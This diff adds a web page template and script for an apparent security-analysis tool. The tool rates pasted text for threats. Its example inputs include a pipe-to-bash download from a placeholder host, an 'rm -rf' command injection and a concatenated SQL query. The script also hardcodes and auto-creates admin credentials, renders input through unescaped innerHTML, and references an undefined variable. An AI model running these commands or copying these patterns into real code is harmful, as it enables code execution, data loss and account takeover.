@@ -1,0 +1,477 @@
+<%- include('layout', { title: 'CyberGuard AI Security Analyzer', body: `
+<div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
+  <!-- Security Analysis Panel -->
+  <div class="bg-white dark:bg-secondary-800 shadow-md rounded-lg p-6">
+    <div class="flex items-center mb-4">
+      <div class="bg-red-100 dark:bg-red-900/30 p-3 rounded-full">
+        <i class="fa-solid fa-shield-alt text-red-600 dark:text-red-400"></i>
+      </div>
+      <h2 class="ml-4 text-xl font-semibold">Security Analysis</h2>
+    </div>
+    
+    <div class="space-y-4">
+      <div>
+        <label for="securityInput" class="block text-sm font-medium text-secondary-700 dark:text-secondary-300 mb-1">Enter text to analyze for security threats:</label>
+        <textarea id="securityInput" rows="6" class="block w-full px-3 py-2 border border-secondary-300 dark:border-secondary-700 rounded-md shadow-sm focus:ring-primary-500 focus:border-primary-500 bg-white dark:bg-secondary-900 text-secondary-900 dark:text-secondary-100 sm:text-sm" placeholder="Enter a command, URL, file content, or other text to analyze for security issues..."></textarea>
+      </div>
+      
+      <div>
+        <label for="analysisType" class="block text-sm font-medium text-secondary-700 dark:text-secondary-300 mb-1">Analysis Type</label>
+        <select id="analysisType" class="block w-full py-2 px-3 border border-secondary-300 dark:border-secondary-700 bg-white dark:bg-secondary-900 rounded-md shadow-sm focus:outline-none focus:ring-primary-500 focus:border-primary-500 sm:text-sm">
+          <option value="general" selected>General Security Scan</option>
+          <option value="code">Code Review</option>
+          <option value="url">URL Analysis</option>
+          <option value="command">Command Analysis</option>
+          <option value="config">Configuration Review</option>
+        </select>
+      </div>
+      
+      <div class="flex space-x-2">
+        <button id="analyzeSecurityBtn" class="flex-grow inline-flex justify-center items-center px-4 py-2 border border-transparent text-sm font-medium rounded-md shadow-sm text-white bg-red-600 hover:bg-red-700 dark:bg-red-700 dark:hover:bg-red-800 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500">
+          <i class="fa-solid fa-magnifying-glass mr-2"></i> Analyze Security
+        </button>
+        
+        <button id="clearSecurityBtn" class="inline-flex items-center px-4 py-2 border border-secondary-300 dark:border-secondary-700 text-sm font-medium rounded-md text-secondary-700 dark:text-secondary-300 bg-white dark:bg-secondary-800 hover:bg-secondary-50 dark:hover:bg-secondary-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-primary-500">
+          <i class="fa-solid fa-eraser"></i>
+        </button>
+      </div>
+      
+      <div id="securityExamples" class="mt-4">
+        <h3 class="text-sm font-medium text-secondary-700 dark:text-secondary-300 mb-2">Example Inputs:</h3>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+          <button class="example-btn text-left text-xs p-2 bg-secondary-50 dark:bg-secondary-800 hover:bg-secondary-100 dark:hover:bg-secondary-700 rounded border border-secondary-200 dark:border-secondary-700">
+            curl -s http://example.com/suspicious.sh | bash
+          </button>
+          <button class="example-btn text-left text-xs p-2 bg-secondary-50 dark:bg-secondary-800 hover:bg-secondary-100 dark:hover:bg-secondary-700 rounded border border-secondary-200 dark:border-secondary-700">
+            http://bit.ly/2ZtRvKD
+          </button>
+          <button class="example-btn text-left text-xs p-2 bg-secondary-50 dark:bg-secondary-800 hover:bg-secondary-100 dark:hover:bg-secondary-700 rounded border border-secondary-200 dark:border-secondary-700">
+            exec("rm -rf " + userInput)
+          </button>
+          <button class="example-btn text-left text-xs p-2 bg-secondary-50 dark:bg-secondary-800 hover:bg-secondary-100 dark:hover:bg-secondary-700 rounded border border-secondary-200 dark:border-secondary-700">
+            SELECT * FROM users WHERE username='" + username + "'
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+  
+  <!-- Analysis Results -->
+  <div class="bg-white dark:bg-secondary-800 shadow-md rounded-lg p-6">
+    <div class="flex items-center mb-4">
+      <div class="bg-green-100 dark:bg-green-900/30 p-3 rounded-full">
+        <i class="fa-solid fa-clipboard-check text-green-600 dark:text-green-400"></i>
+      </div>
+      <h2 class="ml-4 text-xl font-semibold">Analysis Results</h2>
+    </div>
+    
+    <div id="analysisLoader" class="hidden py-10 flex justify-center">
+      <div class="inline-flex items-center px-4 py-2 font-semibold leading-6 text-sm rounded-md text-primary-700 dark:text-primary-300 bg-primary-100 dark:bg-primary-900/30">
+        <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-primary-700 dark:text-primary-300" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+        </svg>
+        Analyzing Security Threats...
+      </div>
+    </div>
+    
+    <div id="analysisResultsContainer" class="hidden space-y-4">
+      <div id="threatLevelContainer" class="p-4 rounded-lg">
+        <div class="flex items-center">
+          <div id="threatLevelIcon" class="mr-3 text-2xl"></div>
+          <div>
+            <h3 class="font-bold text-lg" id="threatLevelTitle">Analyzing...</h3>
+            <p class="text-sm" id="threatLevelDescription"></p>
+          </div>
+        </div>
+      </div>
+      
+      <div>
+        <h3 class="text-lg font-medium text-secondary-900 dark:text-secondary-100 mb-2">Detailed Analysis</h3>
+        <div id="analysisResults" class="bg-secondary-50 dark:bg-secondary-900 border border-secondary-200 dark:border-secondary-700 rounded-lg p-4 overflow-auto max-h-96 text-sm"></div>
+      </div>
+      
+      <div>
+        <h3 class="text-lg font-medium text-secondary-900 dark:text-secondary-100 mb-2">Recommendations</h3>
+        <ul id="securityRecommendations" class="list-disc list-inside space-y-1 text-sm pl-2"></ul>
+      </div>
+    </div>
+    
+    <div id="initialContent" class="py-10 text-center text-secondary-500 dark:text-secondary-400">
+      <i class="fa-solid fa-shield-alt text-5xl mb-3 opacity-30"></i>
+      <p>Enter text in the panel on the left and click "Analyze Security" to get started</p>
+    </div>
+  </div>
+</div>
+
+<!-- Security Reports History -->
+<div class="mt-6 bg-white dark:bg-secondary-800 shadow-md rounded-lg p-6">
+  <div class="flex items-center mb-4">
+    <div class="bg-blue-100 dark:bg-blue-900/30 p-3 rounded-full">
+      <i class="fa-solid fa-history text-blue-600 dark:text-blue-400"></i>
+    </div>
+    <h2 class="ml-4 text-xl font-semibold">Recent Security Analyses</h2>
+  </div>
+  
+  <div class="overflow-x-auto">
+    <table class="min-w-full divide-y divide-secondary-200 dark:divide-secondary-700">
+      <thead>
+        <tr>
+          <th scope="col" class="px-4 py-3 text-left text-xs font-medium text-secondary-500 uppercase tracking-wider">Timestamp</th>
+          <th scope="col" class="px-4 py-3 text-left text-xs font-medium text-secondary-500 uppercase tracking-wider">Analysis Type</th>
+          <th scope="col" class="px-4 py-3 text-left text-xs font-medium text-secondary-500 uppercase tracking-wider">Input Preview</th>
+          <th scope="col" class="px-4 py-3 text-left text-xs font-medium text-secondary-500 uppercase tracking-wider">Threat Level</th>
+          <th scope="col" class="px-4 py-3 text-left text-xs font-medium text-secondary-500 uppercase tracking-wider">Actions</th>
+        </tr>
+      </thead>
+      <tbody id="securityHistoryTable" class="divide-y divide-secondary-200 dark:divide-secondary-700">
+        <!-- Generated dynamically -->
+      </tbody>
+    </table>
+  </div>
+  
+  <div id="noHistoryMessage" class="text-center py-6 text-secondary-500 dark:text-secondary-400">
+    No security analyses have been performed yet.
+  </div>
+</div>
+` }) %>
+
+<script>
+  // Security Analyzer scripts
+  document.addEventListener('DOMContentLoaded', async function() {
+    // DOM Elements
+    const securityInput = document.getElementById('securityInput');
+    const analysisType = document.getElementById('analysisType');
+    const analyzeSecurityBtn = document.getElementById('analyzeSecurityBtn');
+    const clearSecurityBtn = document.getElementById('clearSecurityBtn');
+    const securityExamples = document.querySelectorAll('.example-btn');
+    const analysisLoader = document.getElementById('analysisLoader');
+    const analysisResultsContainer = document.getElementById('analysisResultsContainer');
+    const initialContent = document.getElementById('initialContent');
+    const threatLevelContainer = document.getElementById('threatLevelContainer');
+    const threatLevelIcon = document.getElementById('threatLevelIcon');
+    const threatLevelTitle = document.getElementById('threatLevelTitle');
+    const threatLevelDescription = document.getElementById('threatLevelDescription');
+    const analysisResults = document.getElementById('analysisResults');
+    const securityRecommendations = document.getElementById('securityRecommendations');
+    const securityHistoryTable = document.getElementById('securityHistoryTable');
+    const noHistoryMessage = document.getElementById('noHistoryMessage');
+    
+    // State
+    let token = localStorage.getItem('demo_admin_token');
+    let securityHistory = [];
+    
+    // Functions
+    const createDummyToken = async () => {
+      if (!token) {
+        try {
+          // Create a demo admin user if not exists
+          const signupRes = await fetch('/api/auth/signup', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              email: 'admin@cyberguard.ai',
+              fullname: 'Admin User',
+              password: 'admin123'
+            })
+          });
+          
+          if (signupRes.ok) {
+            const data = await signupRes.json();
+            token = data.token;
+            localStorage.setItem('demo_admin_token', token);
+          } else {
+            // Try login instead
+            const loginRes = await fetch('/api/auth/login', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                email: 'admin@cyberguard.ai',
+                password: 'admin123'
+              })
+            });
+            
+            if (loginRes.ok) {
+              const data = await loginRes.json();
+              token = data.token;
+              localStorage.setItem('demo_admin_token', token);
+            }
+          }
+        } catch (error) {
+          console.error('Auth error:', error);
+        }
+      }
+    };
+    
+    const analyzeSecurityThreats = async (text, type) => {
+      try {
+        // Show loading state
+        initialContent.classList.add('hidden');
+        analysisResultsContainer.classList.add('hidden');
+        analysisLoader.classList.remove('hidden');
+        
+        // Call the security analysis API
+        const res = await fetch('/api/admin/test-security', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': \`Bearer \${token}\`
+          },
+          body: JSON.stringify({ text })
+        });
+        
+        if (res.ok) {
+          const data = await res.json();
+          
+          // Add to history
+          const historyEntry = {
+            id: Date.now(),
+            timestamp: new Date().toISOString(),
+            type: type,
+            input: text.substring(0, 50) + (text.length > 50 ? '...' : ''),
+            threatLevel: data.threatLevel,
+            analysis: data.analysis,
+            recommendations: generateRecommendations(data.threatLevel, type)
+          };
+          
+          securityHistory.unshift(historyEntry);
+          updateHistoryTable();
+          
+          // Show results
+          displayResults(historyEntry);
+        } else {
+          throw new Error('Failed to analyze security threats');
+        }
+      } catch (error) {
+        console.error('Security analysis error:', error);
+        
+        // Show error in results
+        analysisResults.innerHTML = \`
+          <div class="text-red-600 dark:text-red-400">
+            <p>Error analyzing security threats: \${error.message}</p>
+            <p class="mt-2">Please try again or check your connection.</p>
+          </div>
+        \`;
+      } finally {
+        // Hide loader
+        analysisLoader.classList.add('hidden');
+        analysisResultsContainer.classList.remove('hidden');
+      }
+    };
+    
+    const displayResults = (result) => {
+      // Set threat level
+      if (result.threatLevel === 'HIGH') {
+        threatLevelContainer.className = 'p-4 rounded-lg bg-red-100 dark:bg-red-900/30 border border-red-200 dark:border-red-800/50';
+        threatLevelIcon.className = 'mr-3 text-2xl text-red-600 dark:text-red-400';
+        threatLevelIcon.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i>';
+        threatLevelTitle.className = 'font-bold text-lg text-red-800 dark:text-red-300';
+        threatLevelTitle.textContent = 'HIGH THREAT LEVEL';
+        threatLevelDescription.className = 'text-sm text-red-700 dark:text-red-400';
+        threatLevelDescription.textContent = 'Immediate attention required. This content contains serious security risks.';
+      } else if (result.threatLevel === 'MEDIUM') {
+        threatLevelContainer.className = 'p-4 rounded-lg bg-yellow-100 dark:bg-yellow-900/30 border border-yellow-200 dark:border-yellow-800/50';
+        threatLevelIcon.className = 'mr-3 text-2xl text-yellow-600 dark:text-yellow-400';
+        threatLevelIcon.innerHTML = '<i class="fa-solid fa-exclamation-circle"></i>';
+        threatLevelTitle.className = 'font-bold text-lg text-yellow-800 dark:text-yellow-300';
+        threatLevelTitle.textContent = 'MEDIUM THREAT LEVEL';
+        threatLevelDescription.className = 'text-sm text-yellow-700 dark:text-yellow-400';
+        threatLevelDescription.textContent = 'Caution advised. This content contains potential security concerns.';
+      } else {
+        threatLevelContainer.className = 'p-4 rounded-lg bg-green-100 dark:bg-green-900/30 border border-green-200 dark:border-green-800/50';
+        threatLevelIcon.className = 'mr-3 text-2xl text-green-600 dark:text-green-400';
+        threatLevelIcon.innerHTML = '<i class="fa-solid fa-check-circle"></i>';
+        threatLevelTitle.className = 'font-bold text-lg text-green-800 dark:text-green-300';
+        threatLevelTitle.textContent = 'LOW THREAT LEVEL';
+        threatLevelDescription.className = 'text-sm text-green-700 dark:text-green-400';
+        threatLevelDescription.textContent = 'No significant security threats detected in this content.';
+      }
+      
+      // Set analysis results
+      analysisResults.innerHTML = formatAnalysisText(result.analysis);
+      
+      // Set recommendations
+      securityRecommendations.innerHTML = '';
+      result.recommendations.forEach(rec => {
+        const li = document.createElement('li');
+        li.textContent = rec;
+        securityRecommendations.appendChild(li);
+      });
+    };
+    
+    const formatAnalysisText = (text) => {
+      // Highlight key phrases
+      let formatted = text
+        .replace(/high risk|high threat/gi, '<span class="text-red-600 dark:text-red-400 font-semibold">$&</span>')
+        .replace(/medium risk|medium threat/gi, '<span class="text-yellow-600 dark:text-yellow-400 font-semibold">$&</span>')
+        .replace(/low risk|low threat/gi, '<span class="text-green-600 dark:text-green-400 font-semibold">$&</span>')
+        .replace(/(sql injection|xss|csrf|command injection|remote code execution|path traversal)/gi, '<span class="bg-red-100 dark:bg-red-900/30 text-red-800 dark:text-red-300 px-1 rounded">$&</span>');
+      
+      // Convert newlines to paragraphs
+      return formatted.split('\n').map(line => line.trim() ? \`<p class="mb-2">\${line}</p>\` : '').join('');
+    };
+    
+    const generateRecommendations = (threatLevel, type) => {
+      const commonRecs = [
+        'Validate all user inputs before processing',
+        'Implement proper error handling that doesn\'t expose sensitive information'
+      ];
+      
+      const typeRecs = {
+        'code': [
+          'Use parameterized queries for database operations',
+          'Sanitize user inputs before using them in code execution contexts',
+          'Implement strict type checking'
+        ],
+        'url': [
+          'Verify URLs against a known-good allowlist when possible',
+          'Use a URL reputation checking service before accessing unknown URLs',
+          'Scan downloaded content with security tools before execution'
+        ],
+        'command': [
+          'Avoid using shell commands with user input',
+          'If shell commands are necessary, use absolute paths and validate all arguments',
+          'Consider alternatives to command execution when possible'
+        ],
+        'config': [
+          'Use secure defaults for all configuration settings',
+          'Regularly audit configuration files for security issues',
+          'Restrict permissions on sensitive configuration files'
+        ]
+      };
+      
+      // High threat gets more recommendations
+      let recs = [...commonRecs];
+      
+      if (typeRecs[type]) {
+        recs = recs.concat(typeRecs[type]);
+      }
+      
+      if (threatLevel === 'HIGH') {
+        recs.push('Perform a comprehensive security review of related components');
+        recs.push('Consider implementing additional security monitoring');
+      }
+      
+      return recs;
+    };
+    
+    const updateHistoryTable = () => {
+      if (securityHistory.length === 0) {
+        noHistoryMessage.classList.remove('hidden');
+        securityHistoryTable.innerHTML = '';
+        return;
+      }
+      
+      noHistoryMessage.classList.add('hidden');
+      securityHistoryTable.innerHTML = '';
+      
+      securityHistory.forEach(entry => {
+        const row = document.createElement('tr');
+        
+        // Format date
+        const date = new Date(entry.timestamp);
+        const formattedDate = date.toLocaleString();
+        
+        // Create threat level badge
+        let threatBadge = '';
+        if (entry.threatLevel === 'HIGH') {
+          threatBadge = '<span class="px-2 py-1 text-xs font-semibold rounded-full bg-red-100 dark:bg-red-900/30 text-red-800 dark:text-red-300">HIGH</span>';
+        } else if (entry.threatLevel === 'MEDIUM') {
+          threatBadge = '<span class="px-2 py-1 text-xs font-semibold rounded-full bg-yellow-100 dark:bg-yellow-900/30 text-yellow-800 dark:text-yellow-300">MEDIUM</span>';
+        } else {
+          threatBadge = '<span class="px-2 py-1 text-xs font-semibold rounded-full bg-green-100 dark:bg-green-900/30 text-green-800 dark:text-green-300">LOW</span>';
+        }
+        
+        row.innerHTML = \`
+          <td class="px-4 py-3 text-sm">\${formattedDate}</td>
+          <td class="px-4 py-3 text-sm">\${entry.type.charAt(0).toUpperCase() + entry.type.slice(1)}</td>
+          <td class="px-4 py-3 text-sm font-mono text-xs">\${entry.input}</td>
+          <td class="px-4 py-3 text-sm">\${threatBadge}</td>
+          <td class="px-4 py-3 text-sm">
+            <button data-id="\${entry.id}" class="view-result-btn text-primary-600 dark:text-primary-400 hover:text-primary-900 dark:hover:text-primary-300">
+              <i class="fa-solid fa-eye mr-1"></i> View
+            </button>
+          </td>
+        \`;
+        
+        securityHistoryTable.appendChild(row);
+      });
+      
+      // Add event listeners for view buttons
+      document.querySelectorAll('.view-result-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+          const id = parseInt(btn.getAttribute('data-id'));
+          const entry = securityHistory.find(e => e.id === id);
+          if (entry) {
+            displayResults(entry);
+            initialContent.classList.add('hidden');
+            analysisLoader.classList.add('hidden');
+            analysisResultsContainer.classList.remove('hidden');
+            
+            // Scroll to results
+            analysisResultsContainer.scrollIntoView({ behavior: 'smooth' });
+          }
+        });
+      });
+    };
+    
+    // Initialize
+    await createDummyToken();
+    
+    // Event listeners
+    analyzeSecurityBtn.addEventListener('click', () => {
+      const text = securityInput.value.trim();
+      const type = analysisType.value;
+      
+      if (text) {
+        analyzeSecurityThreats(text, type);
+      }
+    });
+    
+    clearSecurityBtn.addEventListener('click', () => {
+      securityInput.value = '';
+    });
+    
+    securityExamples.forEach(btn => {
+      btn.addEventListener('click', () => {
+        securityInput.value = btn.textContent.trim();
+      });
+    });
+    
+    // Add some example history entries
+    setTimeout(() => {
+      securityHistory = [
+        {
+          id: Date.now() - 3600000,
+          timestamp: new Date(Date.now() - 3600000).toISOString(),
+          type: 'code',
+          input: 'SELECT * FROM users WHERE username=\'' + username + '\'',
+          threatLevel: 'HIGH',
+          analysis: 'This code contains a SQL Injection vulnerability. The user input is directly concatenated into the SQL query without proper sanitization or parameterization. This could allow an attacker to manipulate the query and potentially access, modify, or delete data from your database.\n\nThis is a HIGH RISK security issue that should be addressed immediately.',
+          recommendations: [
+            'Use parameterized queries or prepared statements',
+            'Implement input validation and sanitization',
+            'Consider using an ORM (Object-Relational Mapping) library',
+            'Implement proper error handling that doesn\'t expose sensitive information',
+            'Perform a comprehensive security review of related database code'
+          ]
+        },
+        {
+          id: Date.now() - 7200000,
+          timestamp: new Date(Date.now() - 7200000).toISOString(),
+          type: 'url',
+          input: 'http://bit.ly/2ZtRvKD',
+          threatLevel: 'MEDIUM',
+          analysis: 'This is a shortened URL, which obscures the actual destination. Short URLs can be used to hide malicious destinations.\n\nWhile not inherently malicious, shortened URLs present a MEDIUM RISK as they prevent users from evaluating the trustworthiness of the destination before clicking.',
+          recommendations: [
+            'Use URL expansion services to verify the actual destination',
+            'Implement URL scanning in your application',
+            'Consider disallowing shortened URLs in security-sensitive contexts',
+            'Educate users about the risks of clicking on shortened URLs'
+          ]
+        }
+      ];
+      updateHistoryTable();
+    }, 1000);
+  });
+</script>
